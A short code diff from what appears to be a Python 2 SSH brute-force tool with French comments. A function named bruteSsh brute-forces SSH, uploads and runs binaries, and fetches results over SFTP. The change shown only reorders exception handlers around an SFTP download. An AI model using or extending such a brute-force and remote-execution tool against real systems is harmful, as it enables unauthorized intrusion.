@@ -174,11 +174,13 @@ def bruteSsh(ip): #BruteForce SSH + envoi de binaires + execution + récupérati
 			time.sleep(5)
 			sftp.get(remotezip,tolocalzip)
 			break
-		except:
-			print "[*] erreur lors du transfert sftp"
-			break
+
 		except KeyboardInterrupt:
 			print "[*] Interruption du bruteforce"
+			break
+		
+		except:
+			print "[*] erreur lors du transfert sftp"
 			break
 		ssh.close()
 
